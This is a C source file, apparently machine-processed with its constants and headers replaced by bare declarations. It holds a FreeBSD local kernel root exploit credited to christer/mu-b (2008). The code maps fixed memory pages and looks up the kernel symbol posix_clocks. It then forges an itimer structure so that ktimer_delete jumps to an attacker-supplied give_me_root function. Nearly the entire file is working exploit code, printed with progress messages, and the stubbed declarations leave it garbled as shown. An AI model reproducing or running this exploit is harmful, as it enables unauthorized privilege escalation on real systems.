
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct kld_sym_lookup {int version; char* symname; int symvalue; } ;
struct itimer {int it_flags; int it_clockid; scalar_t__ it_usecount; } ;
typedef int ksym ;


 int EXIT_FAILURE ;
 int EXIT_SUCCESS ;
 int ITPSIZE ;
 int KLDSYM_LOOKUP ;
 int LOOKUP ;
 int MAP_ANON ;
 int MAP_FIXED ;
 int PROT_READ ;
 int PROT_WRITE ;
 int exit (int ) ;
 int fflush (int ) ;
 int fprintf (int ,char*,char*,...) ;
 scalar_t__ give_me_root ;
 scalar_t__ kldsym (int ,int ,struct kld_sym_lookup*) ;
 int ktimer_create (int ,int ,int*) ;
 int ktimer_delete (int) ;
 int memset (struct itimer*,int ,int) ;
 void* mmap (struct itimer**,int,int,int,int,int ) ;
 int printf (char*,...) ;
 int sleep (int) ;
 int stderr ;
 int stdout ;

int
main (int argc, char **argv)
{
  struct itimer **itp_page, *it_page;
  struct kld_sym_lookup ksym;
  void *zpage[16];
  int i, r;

  printf ("FreeBSD local kernel root exploit\n"
          "by: christer/mu-b\n"
          "http://www.bsdcitizen.org/ -- BSDCITIZEN 2008!@$!\n\n");

  itp_page = mmap (0, ITPSIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANON, -1, 0);
  if (itp_page < 0)
    {
      fprintf (stderr, "%s: failed to mmap %d-bytes\n",
                       argv[0], ITPSIZE);
      exit (EXIT_FAILURE);
    }

  printf ("* allocated pointer page: 0x%08X -> 0x%08X [%d-bytes]\n",
          (int) itp_page, (int) itp_page + ITPSIZE, ITPSIZE);

  it_page = mmap (itp_page + ITPSIZE, sizeof (struct itimer),
                  PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANON, -1, 0);
  if (it_page < 0)
    {
      fprintf (stderr, "%s: failed to mmap %d-bytes\n",
                       argv[0], sizeof (struct itimer));
      exit (EXIT_FAILURE);
    }

  printf ("* allocated itimer struct: 0x%08X -> 0x%08X [%d-bytes]\n",
          (int) it_page, (int) it_page + sizeof (struct itimer), sizeof (struct itimer));

  printf ("* filling pointer page... ");
  fflush (stdout);

  for (i = 0; i < ITPSIZE / sizeof (struct itimer *); i++)
    itp_page[i] = it_page;
  printf ("done\n");

  ksym.version = sizeof(ksym);
  ksym.symname = "posix_clocks";

  if (kldsym(0,KLDSYM_LOOKUP,&ksym) < 0)
    {
      fprintf (stderr, "%s: failed to lookup posix_clocks\n", argv[0]);
      exit (EXIT_FAILURE);
    }

  printf("* found posix_clocks @ [0x%x]\n",(unsigned )ksym.symvalue);

  for (i = 0; i < 16; i++)
    zpage[i] = (void *) give_me_root;

  memset (it_page, 0, sizeof (struct itimer));

  for (i = 0; i < 10; i++)
    ((unsigned int *) it_page)[i] = 4;

  it_page->it_flags = 0x00;
  it_page->it_usecount = 0;
  it_page->it_clockid = ((int) &zpage[8] - ksym.symvalue) / 20;

  printf ("* it_page->it_clockid: 0x%08X [access @0x%08X]\n",
           it_page->it_clockid,(unsigned )&zpage[8]);
  printf ("* ktimer_delete (0x%08X)\n", LOOKUP);

  sleep (2);
  ktimer_create (0, 0, &i);
  r = ktimer_delete (LOOKUP);

  printf ("* ktimer_delete: %d %d\n", r, it_page->it_flags);

  return (EXIT_SUCCESS);
}
